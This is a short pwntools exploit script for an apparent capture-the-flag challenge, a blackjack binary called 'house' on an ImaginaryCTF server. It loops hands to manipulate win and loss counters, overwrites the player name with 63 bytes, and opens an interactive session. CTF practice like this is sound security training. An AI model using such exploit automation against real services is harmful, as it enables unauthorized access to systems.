#!/usr/bin/python3

from pwn import *

exe = ELF("house", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""


                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("puzzler7.imaginaryctf.org", 15999)
else:
    p = process(exe.path)

count_loss = 0
count_win = 0


def play():
    global count_loss
    global count_win

    sla(b">>> ", "1")

    p.recvuntil(b"total:")
    p.recvline()
    if "BUST" in p.recvline().decode():
        p.sendline()
    sla(b">>> ", "2")

    res = p.recvuntil(b"Press").decode()
    if "You win this hand" not in res:
        count_loss += 1
    else:
        count_win += 1
    p.sendline()


def change_name():
    sla(b">>> ", "4")
    sa(b"name: ", "a" * 63)


def show():
    sla(b">>> ", "3")
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())
    p.sendline()


# GDB()
p.recvuntil(b"name: ", timeout=300)
sl(b"a")
while count_win <= 0x31:
    while count_loss < 10:
        play()
    print(count_loss)
    count_loss = 0
    print(count_win)
    sleep(1)
    change_name()
    show()
# p.sendline()

p.interactive()
